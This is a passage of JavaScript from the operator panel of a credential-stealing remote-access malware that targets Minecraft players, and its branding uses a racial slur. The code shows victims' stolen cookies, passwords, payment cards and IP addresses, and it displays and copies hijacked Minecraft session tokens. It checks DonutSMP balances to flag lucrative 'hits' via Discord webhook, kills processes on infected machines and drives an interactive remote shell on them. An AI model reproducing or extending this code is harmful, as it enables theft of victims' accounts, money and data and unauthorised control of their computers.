                from_sid: (socket && socket.id) ? socket.id : ''
            });

            if (res.success && res.id) {
                pollProcessResult(res.id);
            }
        }

        async function pollProcessResult(commandId) {
            let attempts = 0;
            const maxAttempts = 30;

            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);

                if (res.success && res.command && res.command.status === 'completed') {
                    try {
                        const data = JSON.parse(res.command.result);
                        if (data.error) {
                            document.getElementById('processListTable').innerHTML = `<tr> <td colspan="3" style="text-align:center; color: var(--danger);">Error: ${data.error}</td></tr> `;
                        } else if (data.processes) {
                            renderProcessList(data.processes);
                        }
                    } catch (e) {
                        document.getElementById('processListTable').innerHTML = `<tr> <td colspan="3" style="text-align:center; color: var(--danger);">Failed to parse process list</td></tr> `;
                    }
                    return;
                }

                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                } else {
                    document.getElementById('processListTable').innerHTML = `<tr> <td colspan="3" style="text-align:center; color: var(--warning);">Timeout waiting for client</td></tr> `;
                }
            };

            poll();
        }

        function renderProcessList(processes) {
            if (!processes || processes.length === 0) {
                document.getElementById('processListTable').innerHTML = '<tr><td colspan="3" style="text-align:center;">No processes found</td></tr>';
                return;
            }

            // Sort by name
            processes.sort((a, b) => a.name.localeCompare(b.name));

            document.getElementById('processListTable').innerHTML = processes.map(p => {
                const safeName = escapeHtml(p.name).replace(/'/g, "\\'");
                return `
                <tr>
                    <td style="font-family: monospace;">${p.pid}</td>
                    <td>${escapeHtml(p.name)}</td>
                    <td>
                        <button class="btn btn-xs btn-danger" onclick="killProcess('${p.pid}', '${safeName}')">
                            <i class="fas fa-skull"></i> Kill
                        </button>
                    </td>
                </tr>
                `;
            }).join('');

            document.getElementById('processManagerStatus').innerHTML = `<i class="fas fa-check" style="color: #22c55e;"></i> Loaded ${processes.length} processes`;
        }

        async function killProcess(pid, name) {
            if (!confirm(`Are you sure you want to kill process ${name}(PID: ${pid}) ? `)) return;

            const player = document.getElementById('processPlayerSelect').value;
            if (!player) return;

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'process_manager',
                command_data: 'kill|' + pid
            });

            if (res.success) {
                toast(`Kill command sent for PID ${pid}`);
                // Refresh after delay
                setTimeout(() => refreshProcessList(), 2000);
            }
        }

        // Init
        (async () => {
            if (await checkAuth()) {
                showApp();
            }
            // Initialize Christmas effects
        })();

        // Close modal on outside click
        document.getElementById('modal').addEventListener('click', e => {
            if (e.target.id === 'modal') closeModal();
        });

        // INIT - Check if already logged in
        // --- DonutSMP Integration ---

        // ==================== BROWSER STEALS ====================
        let browserStealsData = [];

        async function loadBrowserSteals() {
            const tbody = document.getElementById('browserTableBody');
            if (tbody) tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:40px;"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>';

            try {
                const res = await api('/api/logs?type=browser');
                if (res.success && res.logs) {
                    browserStealsData = res.logs;
                    renderBrowserSteals(res.logs);
                } else {
                    if (tbody) tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:40px;color:var(--text-muted);">No browser data yet</td></tr>';
                }
            } catch (e) {
                console.error('Failed to load browser steals:', e);
                if (tbody) tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:40px;color:var(--danger);">Error loading data</td></tr>';
            }
        }

        function renderBrowserSteals(logs) {
            const tbody = document.getElementById('browserTableBody');
            if (!tbody) return;

            if (!logs || logs.length === 0) {
                tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;padding:40px;color:var(--text-muted);">No browser data yet</td></tr>';
                return;
            }

            let totalCookies = 0, totalPasswords = 0, totalPayments = 0;

            tbody.innerHTML = logs.map((log, idx) => {
                let data = {};
                try { data = JSON.parse(log.content || '{}'); } catch (e) { }

                // Handle both formats: summary object OR root-level credentials
                let cookies = 0, passwords = 0, payments = 0, autofills = 0;

                if (data.summary) {
                    // Old format with summary object
                    cookies = data.summary.cookies || 0;
                    passwords = data.summary.passwords || 0;
                    payments = data.summary.payments || 0;
                    autofills = data.summary.autofills || 0;
                } else {
                    // New format: credentials at root level
                    if (data.password && data.password.trim() !== '') {
                        passwords = 1;
                    } else if (data.username && data.url) {
                        passwords = 1; // Count as credential even if password empty
                    }
                    cookies = data.cookies?.length || 0;
                }

                totalCookies += cookies;
                totalPasswords += passwords;
                totalPayments += payments;

                const date = log.created_at ? new Date(log.created_at).toLocaleDateString() : 'Unknown';

                return `
                    <tr style="cursor:pointer;" onclick="showBrowserDetails(${idx})">
                        <td><strong>${escapeHtml(data.pc_name || log.pc_name || data.username || 'Unknown')}</strong><br><small style="color:var(--text-muted)">${escapeHtml(data.pc_user || log.pc_user || '')}</small></td>
                        <td><span class="badge" style="background:var(--accent)20;color:var(--accent);">${escapeHtml(data.browser || 'Unknown')}</span></td>
                        <td style="color:var(--warning);font-weight:bold;">${cookies}</td>
                        <td style="color:var(--danger);font-weight:bold;">${passwords}</td>
                        <td>${autofills}</td>
                        <td style="color:var(--success);font-weight:bold;">${payments}</td>
                        <td><code style="font-size:11px;">${escapeHtml(log.ip_address || 'Unknown')}</code></td>
                        <td style="font-size:12px;color:var(--text-muted);">${date}</td>
                        <td>
                            <button class="btn btn-sm" style="background:var(--accent);padding:4px 8px;font-size:11px;" onclick="event.stopPropagation();showBrowserDetails(${idx})">
                                <i class="fas fa-eye"></i> View
                            </button>
                        </td>
                    </tr>
                `;
            }).join('');

            // Update stats
            document.getElementById('browserTotalCookies').textContent = totalCookies.toLocaleString();
            document.getElementById('browserTotalPasswords').textContent = totalPasswords.toLocaleString();
            document.getElementById('browserTotalPayments').textContent = totalPayments.toLocaleString();
            document.getElementById('browserTotalLogs').textContent = logs.length;
        }


        function showBrowserDetails(idx) {
            const log = browserStealsData[idx];
            if (!log) return;

            let data = {};
            try { data = JSON.parse(log.content || '{}'); } catch (e) { }

            // Handle both formats: nested data OR root-level credentials
            let passwords = data.data?.passwords || [];
            let cookies = data.data?.cookies || data.cookies || [];
            let payments = data.data?.payments || [];
            let autofills = data.data?.autofills || [];

            // If arrays are empty but we have root-level credential, create one
            if (passwords.length === 0 && (data.url || data.username)) {
                passwords = [{
                    url: data.url || '',
                    username: data.username || '',
                    password: data.password || ''
                }];
            }

            const modal = document.createElement('div');
            modal.className = 'modal active';
            modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
            modal.innerHTML = `
                <div class="modal-content" style="max-width:900px;max-height:85vh;overflow:auto;">
                    <div class="modal-header">
                        <h3><i class="fas fa-globe" style="color:var(--accent);"></i> ${escapeHtml(data.pc_name || data.username || 'Unknown')} - ${escapeHtml(data.browser || 'Browser')}</h3>
                        <button class="modal-close" onclick="this.closest('.modal').remove()">&times;</button>
                    </div>
                    <div class="modal-body">
                        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px;">
                            <div class="glass-panel" style="padding:12px;text-align:center;">
                                <div style="font-size:24px;font-weight:bold;color:var(--warning);">${cookies.length}</div>
                                <div style="font-size:11px;color:var(--text-muted);">Cookies</div>
                            </div>
                            <div class="glass-panel" style="padding:12px;text-align:center;">
                                <div style="font-size:24px;font-weight:bold;color:var(--danger);">${passwords.length}</div>
                                <div style="font-size:11px;color:var(--text-muted);">Credentials</div>
                            </div>
                            <div class="glass-panel" style="padding:12px;text-align:center;">
                                <div style="font-size:24px;font-weight:bold;color:var(--success);">${payments.length}</div>
                                <div style="font-size:11px;color:var(--text-muted);">Payments</div>
                            </div>
                            <div class="glass-panel" style="padding:12px;text-align:center;">
                                <div style="font-size:24px;font-weight:bold;">${autofills.length}</div>
                                <div style="font-size:11px;color:var(--text-muted);">Autofills</div>
                            </div>
                        </div>
                        
                        ${passwords.length > 0 ? `
                        <div class="glass-panel" style="padding:16px;margin-bottom:16px;">
                            <h4 style="margin-bottom:12px;color:var(--danger);"><i class="fas fa-key"></i> Credentials (${passwords.length})</h4>
                            <div style="max-height:200px;overflow-y:auto;">
                                <table style="width:100%;font-size:12px;">
                                    <tr style="background:var(--bg-tertiary);"><th style="padding:8px;">URL</th><th style="padding:8px;">Username</th><th style="padding:8px;">Password</th></tr>
                                    ${passwords.slice(0, 50).map(p => `
                                        <tr><td style="padding:6px;word-break:break-all;">${escapeHtml(p.url || p.origin_url || '')}</td>
                                        <td style="padding:6px;">${escapeHtml(p.username || p.username_value || '')}</td>
                                        <td style="padding:6px;color:var(--success);"><code>${escapeHtml(p.password || '')}</code></td></tr>
                                    `).join('')}
                                </table>
                            </div>
                        </div>
                        ` : ''}
                        
                        ${payments.length > 0 ? `
                        <div class="glass-panel" style="padding:16px;margin-bottom:16px;">
                            <h4 style="margin-bottom:12px;color:var(--success);"><i class="fas fa-credit-card"></i> Payment Cards (${payments.length})</h4>
                            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;">
                                ${payments.map(p => `
                                    <div style="background:linear-gradient(135deg,#1a1a2e,#16213e);padding:16px;border-radius:12px;border:1px solid var(--border);">
                                        <div style="font-size:18px;letter-spacing:3px;margin-bottom:12px;">${escapeHtml(p.card_number || '**** **** **** ****')}</div>
                                        <div style="display:flex;justify-content:space-between;font-size:12px;color:var(--text-muted);">
                                            <span>${escapeHtml(p.name_on_card || 'Unknown')}</span>
                                            <span>${escapeHtml((p.expiration_month || '??') + '/' + (p.expiration_year || '??'))}</span>
                                        </div>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                        ` : ''}
                        
                        ${cookies.length > 0 ? `
                        <div class="glass-panel" style="padding:16px;">
                            <h4 style="margin-bottom:12px;color:var(--warning);"><i class="fas fa-cookie"></i> Cookies (${cookies.length})</h4>
                            <div style="max-height:200px;overflow-y:auto;font-size:11px;">
                                <table style="width:100%;">
                                    <tr style="background:var(--bg-tertiary);"><th style="padding:6px;">Host</th><th style="padding:6px;">Name</th><th style="padding:6px;">Value</th></tr>
                                    ${cookies.slice(0, 100).map(c => `
                                        <tr><td style="padding:4px;">${escapeHtml(c.host_key || c.host || '')}</td>
                                        <td style="padding:4px;">${escapeHtml(c.name || '')}</td>
                                        <td style="padding:4px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"><code>${escapeHtml((c.value || '').substring(0, 50))}</code></td></tr>
                                    `).join('')}
                                </table>
                            </div>
                        </div>
                        ` : ''}
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
        }


        // ==================== DONUTSMP ====================
        let donutProcessedLogs = new Set();
        let lastNotifTime = 0;
        let donutMcLogs = []; // Store MC logs for token lookup

        // Legacy DonutSMP functions replaced by new auto-loader
        function filterDonutSMP() {
            const filter = document.getElementById('donutSearchLocal').value.toLowerCase();
            const rows = document.querySelectorAll('#donutsmp-content table tbody tr');
            rows.forEach(row => {
                const text = row.innerText.toLowerCase();
                row.style.display = text.includes(filter) ? '' : 'none';
            });
        }

        // DonutSMP Search - fetch player stats and display with token
        let currentDonutToken = '';
        async function searchDonutPlayer() {
            // Get username from dropdown or manual input
            const selectUser = document.getElementById('donutSelectUser')?.value;
            const manualUser = document.getElementById('donutManualUser')?.value.trim();
            const username = manualUser || selectUser;

            if (!username) {
                toast('Please select or enter a username', 'error');
                return;
            }

            const resultDiv = document.getElementById('donutsmp-result');
            const statsDiv = document.getElementById('donutsmp-stats');

            resultDiv.innerHTML = '<div class="text-center p-4"><i class="fas fa-spinner fa-spin"></i> Checking stats for ' + username + '...</div>';
            statsDiv.style.display = 'none';

            try {
                const res = await api(`/api/donutsmp/stats/${username}`);

                if (res.success && res.data) {
                    // API returns { result: { money, shards, kills, deaths, playtime } }
                    const data = res.data.result || res.data;

                    // Find matching token from MC logs (full token)
                    currentDonutToken = '';
                    for (const log of donutMcLogs) {
                        try {
                            const content = JSON.parse(log.content || '{}');
                            if (content.player === username || content.username === username) {
                                if (content.access_token) {
                                    currentDonutToken = content.access_token;
                                    break;
                                }
                            }
                        } catch (e) { }
                    }

                    // Parse values (API returns strings)
                    const money = parseFloat(data.money) || 0;
                    const shards = parseInt(data.shards) || 0;
                    const kills = parseInt(data.kills) || 0;
                    const deaths = parseInt(data.deaths) || 0;
                    const playtimeMs = parseInt(data.playtime) || 0;

                    // Format balance
                    const formattedBalance = '$' + money.toLocaleString();

                    // Calculate K/D
                    const kd = deaths > 0 ? (kills / deaths).toFixed(2) : kills.toFixed(2);

                    // Format playtime (ms to days/hours)
                    const playtimeSec = Math.floor(playtimeMs / 1000);
                    const days = Math.floor(playtimeSec / 86400);
                    const hours = Math.floor((playtimeSec % 86400) / 3600);
                    const formattedPlaytime = days > 0 ? `${days}d ${hours}h` : `${hours}h`;

                    // Hide placeholder, show stats
                    resultDiv.innerHTML = '';
                    statsDiv.style.display = 'block';

                    // Fill in stats grid
                    document.getElementById('donutBalance').textContent = formattedBalance;
                    document.getElementById('donutShards').textContent = shards.toLocaleString();
                    document.getElementById('donutKills').textContent = kills.toLocaleString();
                    document.getElementById('donutDeaths').textContent = deaths.toLocaleString();
                    document.getElementById('donutKD').textContent = kd;
                    document.getElementById('donutPlaytime').textContent = formattedPlaytime;

                    // Show full token
                    const tokenDisplay = document.getElementById('donutTokenDisplay');
                    if (currentDonutToken) {
                        tokenDisplay.textContent = currentDonutToken;
                        tokenDisplay.style.color = '#10b981';
                    } else {
                        tokenDisplay.textContent = 'Token not found in logs';
                        tokenDisplay.style.color = '#888';
                    }

                    toast(`Found ${username}: ${formattedBalance}`, 'success');

                } else {
                    resultDiv.innerHTML = `
                        <div class="glass-panel" style="padding: 16px; background: rgba(239,68,68,0.1); border: 1px solid var(--danger);">
                            <h4 style="color: var(--danger);"><i class="fas fa-times-circle"></i> Player Not Found</h4>
                            <p style="color: var(--text-muted); margin-top: 8px;">${res.error || 'No DonutSMP stats found for "' + username + '"'}</p>
                        </div>
                    `;
                    statsDiv.style.display = 'none';
                }
            } catch (e) {
                console.error('DonutSMP lookup error:', e);
                resultDiv.innerHTML = '<div class="text-center p-4" style="color: var(--danger);"><i class="fas fa-exclamation-triangle"></i> Error checking stats</div>';
            }
        }

        function copyDonutToken() {
            if (currentDonutToken) {
                navigator.clipboard.writeText(currentDonutToken);
                toast('Token copied to clipboard!', 'success');
            } else {
                toast('No token to copy', 'error');
            }
        }

        function selectDonutUser() { }
        async function loadDonutsmp() {
            // Fetch MC logs directly to populate dropdown
            const select = document.getElementById('donutSelectUser');
            if (select) select.innerHTML = '<option value="">Loading logs...</option>';

            try {
                const res = await api('/api/logs?type=minecraft');
                console.log('Logs response:', res);
                if (res.success && res.logs) {
                    // Store logs globally for token lookup
                    donutMcLogs = res.logs;

                    const userMap = new Map(); // Map to store username -> latest timestamp

                    res.logs.forEach(log => {
                        // Parse the content JSON to get the actual Minecraft player name
                        let mcPlayer = null;
                        try {
                            const content = JSON.parse(log.content || '{}');
                            mcPlayer = content.player || content.username || null;
                        } catch (e) {
                            console.warn('Failed to parse MC log content:', e);
                        }

                        if (mcPlayer && mcPlayer !== 'Unknown' && mcPlayer.trim() !== '') {
                            const time = new Date(log.created_at).getTime();
                            // We want the LATEST timestamp for each user
                            if (!userMap.has(mcPlayer)) {
                                userMap.set(mcPlayer, time);
                            } else {
                                if (time > userMap.get(mcPlayer)) {
                                    userMap.set(mcPlayer, time);
                                }
                            }
                        }
                    });

                    if (select) {
                        select.innerHTML = '<option value="">-- Select MC Player --</option>';

                        // Sort users by timestamp descending (newest first)
                        const sortedUsers = Array.from(userMap.entries())
                            .sort((a, b) => b[1] - a[1])
                            .map(entry => entry[0]);

                        sortedUsers.forEach(u => {
                            const opt = document.createElement('option');
                            opt.value = u;
                            opt.textContent = u;
                            select.appendChild(opt);
                        });

                        if (sortedUsers.length === 0) {
                            select.innerHTML = '<option value="">(No MC players found)</option>';
                        }
                    }
                } else {
                    if (select) select.innerHTML = '<option value="">(No logs)</option>';
                }
            } catch (e) {
                console.error('Failed to load MC logs:', e);
                if (select) select.innerHTML = '<option value="">(Error loading)</option>';
            }
        }


        // --- DonutSMP Settings (Backend) ---
        async function loadDonutSettings() {
            try {
                const res = await api('/api/donutsmp/settings', 'GET');
                if (res && (res.webhook !== undefined || res.min_balance !== undefined)) {
                    document.getElementById('donutWebhookInput').value = res.webhook || '';
                    document.getElementById('donutNotifyThreshold').value = res.min_balance || 1000000;
                }
            } catch (e) {
                console.warn('Failed to load DonutSMP settings:', e);
            }
        }

        async function saveDonutSettings() {
            const webhook = document.getElementById('donutWebhookInput').value.trim();
            const minBalance = parseInt(document.getElementById('donutNotifyThreshold').value) || 0;

            if (webhook && !webhook.startsWith('http')) {
                alert('Please enter a valid Discord Webhook URL');
                return;
            }

            const btn = document.querySelector('button[onclick="saveDonutSettings()"]');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Saving...';
            btn.disabled = true;

            try {
                const res = await api('/api/donutsmp/settings', 'POST', {
                    webhook: webhook,
                    min_balance: minBalance
                });

                if (res.status === 'success') {
                    // Send test webhook if URL provided
                    if (webhook) {
                        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Testing...';
                        try {
                            await fetch(webhook, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    embeds: [{
                                        title: ' Webhook Test Successful',
                                        description: 'DonutSMP notifications are now configured.',
                                        color: 0x10B981,
                                        fields: [
                                            { name: 'Min Balance Threshold', value: '$' + minBalance.toLocaleString(), inline: true }
                                        ],
                                        footer: { text: 'Niggaware Panel' },
                                        timestamp: new Date().toISOString()
                                    }]
                                })
                            });
                            toast('Webhook saved & test message sent!', 'success');
                        } catch (e) {
                            console.error('Webhook test failed:', e);
                            toast('Settings saved but webhook test failed', 'warning');
                        }
                    } else {
                        toast('Settings saved!', 'success');
                    }

                    btn.innerHTML = '<i class="fas fa-check"></i> Saved!';
                    setTimeout(() => {
                        btn.innerHTML = originalText;
                        btn.disabled = false;
                    }, 2000);
                } else {
                    alert('Error saving settings: ' + (res.error || 'Unknown error'));
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                }
            } catch (e) {
                console.error(e);
                alert('Failed to save settings');
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        }


        function toggleDonutNotify() {
            const enabled = document.getElementById('donutAutoNotify').checked;
            if (enabled && Notification.permission !== "granted") {
                Notification.requestPermission();
            }
            localStorage.setItem('donut_notify_enabled', enabled);
            localStorage.setItem('donut_notify_threshold', document.getElementById('donutNotifyThreshold').value);
        }

        document.addEventListener('DOMContentLoaded', () => {
            loadDonutSettings(); // Load backend settings

            const enabled = localStorage.getItem('donut_notify_enabled') === 'true';
            if (document.getElementById('donutAutoNotify')) {
                document.getElementById('donutAutoNotify').checked = enabled;
                // We don't overwrite the input value here anymore because we load from backend
            }
        });

        function parseDonutBalance(str) {
            if (!str) return 0;
            str = str.toString().toLowerCase().replace(/,/g, '').replace('$', '');
            let multi = 1;
            if (str.includes('k')) multi = 1000;
            else if (str.includes('m')) multi = 1000000;
            else if (str.includes('b')) multi = 1000000000;
            const val = parseFloat(str.replace(/[kmb]/g, ''));
            return isNaN(val) ? 0 : val * multi;
        }

        async function checkNewDonutHits(logs) {
            const enabled = document.getElementById('donutAutoNotify') && document.getElementById('donutAutoNotify').checked;
            if (!enabled) return;

            const thresholdStr = document.getElementById('donutNotifyThreshold').value || "100m";
            const threshold = parseDonutBalance(thresholdStr);

            for (const log of logs) {
                // Check minecraft logs and extract player name from content
                if (log.log_type === 'minecraft' && !donutProcessedLogs.has(log.id)) {
                    donutProcessedLogs.add(log.id);

                    // Parse content JSON to get actual MC player name
                    let username = null;
                    try {
                        const content = JSON.parse(log.content || '{}');
                        username = content.player || content.username || null;
                    } catch (e) {
                        console.warn('Failed to parse MC log for DonutSMP:', e);
                    }

                    if (!username || username === 'Unknown' || username.trim() === '') continue;

                    try {
                        const res = await api(`/api/donutsmp/stats/${username}`);
                        if (res.success && res.data && res.data.result) {
                            const moneyRaw = parseFloat(res.data.result.money) || 0;
                            if (moneyRaw >= threshold) {
                                if (Date.now() - lastNotifTime > 5000) {
                                    const balStr = formatMoney(moneyRaw);
                                    if (Notification.permission === "granted") {
                                        new Notification(` HIT: ${username}`, {
                                            body: `Balance: ${balStr}`
                                        });
                                    }
                                    toast(` HIT: ${username} (${balStr})`, 'warning');
                                    playNotificationSound();
                                    lastNotifTime = Date.now();
                                }
                            }
                        }
                    } catch (e) { }
                }
            }
        }


        async function populateDonutUserSelect() {
            const select = document.getElementById('donutSelectUser');
            if (!select) return;
            select.innerHTML = '<option value="">-- Choose from Logs --</option>';

            const usernames = new Set();
            try {
                if (window.allLogsData && Array.isArray(window.allLogsData)) {
                    window.allLogsData.forEach(log => {
                        if (log.username && log.username !== 'Unknown') usernames.add(log.username);
                    });
                }
                if (window.allDiscordTokens && Array.isArray(window.allDiscordTokens)) {
                    window.allDiscordTokens.forEach(t => {
                        if (t.username) usernames.add(t.username);
                    });
                }

                if (usernames.size === 0) {
                    select.innerHTML = '<option value="">(No logs found)</option>';
                } else {
                    Array.from(usernames).sort().forEach(u => {
                        const opt = document.createElement('option');
                        opt.value = u;
                        opt.textContent = u;
                        select.appendChild(opt);
                    });
                }
            } catch (e) {
                console.error("Error populating donut select:", e);
                select.innerHTML = '<option value="">(Error loading users)</option>';
            }
        }

        function selectDonutUser() {
            const user = document.getElementById('donutSelectUser').value;
            if (user) {
                document.getElementById('donutSearchInput').value = user;
                searchDonut(user);
            }
        }

        async function searchDonut(inputUser = null) {
            const username = inputUser || document.getElementById('donutSearchInput').value.trim();
            if (!username) return toast('Enter username', 'error');

            document.getElementById('donutResult').style.display = 'block';
            document.getElementById('donutResultContent').innerHTML = '<div style="text-align:center;padding:40px"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';

            // Find token from stored MC logs
            let tokenData = null;
            for (const log of donutMcLogs) {
                try {
                    const content = JSON.parse(log.content || '{}');
                    if (content.player === username || content.username === username) {
                        tokenData = {
                            access_token: content.access_token || '',
                            uuid: content.uuid || '',
                            ip: content.ip || log.ip_address || ''
                        };
                        break;
                    }
                } catch (e) { }
            }

            try {
                const res = await api(`/api/donutsmp/stats/${username}`);
                if (res.success && res.data && res.data.result) {
                    const p = res.data.result;
                    // Use 'money' field and format nicely
                    const moneyRaw = parseFloat(p.money) || 0;
                    const balance = formatMoney(moneyRaw);
                    const kills = parseInt(p.kills) || 0;
                    const deaths = parseInt(p.deaths) || 0;
                    const kd = deaths > 0 ? (kills / deaths).toFixed(2) : kills.toString();
                    const playtime = formatPlaytime(parseInt(p.playtime) || 0);
                    const shards = parseInt(p.shards) || 0;

                    // Build token section if we have token data
                    let tokenSection = '';
                    if (tokenData && tokenData.access_token) {
                        const tokenId = 'mctoken_' + Date.now();
                        window[tokenId] = tokenData.access_token;
                        tokenSection = `
                            <div class="glass-panel" style="padding: 16px; margin-top: 16px;">
                                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                                    <h4 style="margin: 0; color: var(--accent);"><i class="fas fa-key"></i> MC Session Token</h4>
                                    ${tokenData.uuid ? `<span style="font-size: 11px; color: var(--text-muted);">UUID: ${escapeHtml(tokenData.uuid)}</span>` : ''}
                                </div>
                                <div style="background: var(--bg-tertiary); padding: 12px; border-radius: 8px; word-break: break-all; font-family: monospace; font-size: 11px; max-height: 100px; overflow-y: auto; margin-bottom: 12px;">
                                    ${escapeHtml(tokenData.access_token)}
                                </div>
                                <button class="btn" style="width: 100%; background: var(--accent);" onclick="copyText('${tokenId}', this)">
                                    <i class="fas fa-copy"></i> Copy Token
                                </button>
                            </div>
                        `;
                    }

                    document.getElementById('donutResultContent').innerHTML = `
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 16px;">
                            <div class="glass-panel" style="padding: 16px; text-align: center;">
                                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">Balance</div>
                                <div style="font-size: 24px; font-weight: bold; color: var(--success);">${balance}</div>
                            </div>
                            <div class="glass-panel" style="padding: 16px; text-align: center;">
                                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">Shards</div>
                                <div style="font-size: 24px; font-weight: bold; color: #a855f7;">${shards}</div>
                            </div>
                            <div class="glass-panel" style="padding: 16px; text-align: center;">
                                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">Kills</div>
                                <div style="font-size: 24px; font-weight: bold; color: var(--danger);">${kills}</div>
                            </div>
                            <div class="glass-panel" style="padding: 16px; text-align: center;">
                                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">Deaths</div>
                                <div style="font-size: 24px; font-weight: bold;">${deaths}</div>
                            </div>
                            <div class="glass-panel" style="padding: 16px; text-align: center;">
                                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">K/D Ratio</div>
                                <div style="font-size: 24px; font-weight: bold;">${kd}</div>
                            </div>
                            <div class="glass-panel" style="padding: 16px; text-align: center;">
                                <div style="font-size: 12px; color: var(--text-muted); text-transform: uppercase;">Playtime</div>
                                <div style="font-size: 18px; font-weight: bold;">${playtime}</div>
                            </div>
                        </div>
                        ${tokenSection}
                    `;
                } else {
                    document.getElementById('donutResultContent').innerHTML = `<div style="text-align:center;padding:40px;color:var(--danger)">${res.error || 'Player not found'}</div>`;
                }
            } catch (e) { document.getElementById('donutResultContent').textContent = 'Error: ' + e.message; }
        }


        // Format money: 499468198  $499.47M
        function formatMoney(num) {
            if (num >= 1e9) return '$' + (num / 1e9).toFixed(2) + 'B';
            if (num >= 1e6) return '$' + (num / 1e6).toFixed(2) + 'M';
            if (num >= 1e3) return '$' + (num / 1e3).toFixed(2) + 'K';
            return '$' + num.toFixed(0);
        }

        // Format playtime (ms) to readable
        function formatPlaytime(ms) {
            const hours = Math.floor(ms / 3600000);
            if (hours > 24) return Math.floor(hours / 24) + 'd ' + (hours % 24) + 'h';
            return hours + 'h';
        }

        function playNotificationSound() {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.type = 'sine';
                osc.frequency.setValueAtTime(880, ctx.currentTime);
                gain.gain.setValueAtTime(0.1, ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.00001, ctx.currentTime + 0.5);
                osc.start();
                osc.stop(ctx.currentTime + 0.5);
            } catch (e) { }
        }

        window.addEventListener('load', async () => {
            if (token) {
                if (await checkAuth()) {
                    showApp();
                } else {
                    logout();
                }
            }
        });

        // ==================== XTERM.JS INTERACTIVE SHELL ====================
        let term = null;
        let fitAddon = null;
        let shellBuffer = '';
        let shellConnected = false;

        function initTerminal() {
            if (term) {
                // Already initialized
                fitAddon.fit();
                return;
            }

            const termContainer = document.getElementById('terminal');
            if (!termContainer) {
                console.error('Terminal container not found');
                return;
            }

            // Create Terminal with Matrix-style theme
            term = new Terminal({
                cursorBlink: true,
                cursorStyle: 'bar',
                fontSize: 14,
                fontFamily: '"JetBrains Mono", "Fira Code", "Consolas", monospace',
                theme: {
                    background: '#0d1117',
                    foreground: '#00ff9d',
                    cursor: '#00ff9d',
                    cursorAccent: '#0d1117',
                    selectionBackground: '#00ff9d33',
                    black: '#0d1117',
                    red: '#ff5555',
                    green: '#00ff9d',
                    yellow: '#f1fa8c',
                    blue: '#6272a4',
                    magenta: '#ff79c6',
                    cyan: '#8be9fd',
                    white: '#f8f8f2',
                    brightBlack: '#6272a4',
                    brightRed: '#ff6e6e',
                    brightGreen: '#69ff94',
                    brightYellow: '#ffffa5',
                    brightBlue: '#d6acff',
                    brightMagenta: '#ff92df',
                    brightCyan: '#a4ffff',
                    brightWhite: '#ffffff'
                },
                allowTransparency: true,
                scrollback: 5000,
                convertEol: true
            });

            // Fit addon for responsive sizing
            fitAddon = new FitAddon.FitAddon();
            term.loadAddon(fitAddon);

            // Open terminal in container
            term.open(termContainer);
            fitAddon.fit();

            // Welcome message
            term.writeln('\x1b[1;32m\x1b[0m');
            term.writeln('\x1b[1;32m\x1b[0m  \x1b[1;36m  NIGGAWARE REMOTE SHELL v2.0\x1b[0m                          \x1b[1;32m\x1b[0m');
            term.writeln('\x1b[1;32m\x1b[0m  \x1b[33mSelect a player above to start interactive session\x1b[0m      \x1b[1;32m\x1b[0m');
            term.writeln('\x1b[1;32m\x1b[0m');
            term.writeln('');

            // Handle keyboard input
            term.onData(data => {
                if (!shellConnected) {
                    term.write('\r\n\x1b[31m[!] Not connected. Select a player first.\x1b[0m\r\n');
                    return;
                }

                // Handle special keys
                if (data === '\r') {
                    // Enter pressed - send command
                    term.write('\r\n');
                    if (shellBuffer.trim()) {
                        sendShellCommand(shellBuffer);
                    }
                    shellBuffer = '';
                } else if (data === '\x7f') {
                    // Backspace
                    if (shellBuffer.length > 0) {
                        shellBuffer = shellBuffer.slice(0, -1);
                        term.write('\b \b');
                    }
                } else if (data === '\x03') {
                    // Ctrl+C
                    sendShellCommand('\x03');
                    shellBuffer = '';
                    term.write('^C\r\n');
                } else if (data.charCodeAt(0) >= 32) {
                    // Regular character
                    shellBuffer += data;
                    term.write(data);
                }
            });

            // Handle window resize
            window.addEventListener('resize', () => {
                if (fitAddon) fitAddon.fit();
            });

            console.log('Terminal initialized');
        }

        function sendShellCommand(cmd) {
            const player = document.getElementById('shellPlayerSelect')?.value;
            if (!player) {
                term.writeln('\x1b[31m[!] No player selected\x1b[0m');
                return;
            }

            // Prefer WebSocket for real-time response
            if (socket && socket.connected) {
                // Guardian expects execute_command with {type: 'shell', data: cmd, from_sid: ...}
                socket.emit('remote_command', {
                    player: player,
                    cmd_type: 'shell',
                    cmd_data: cmd
                });
                console.log('[Shell] Sent via WebSocket:', cmd);
            } else {
                // Fallback to HTTP API
                api('/api/remote/command', 'POST', {
                    player: player,
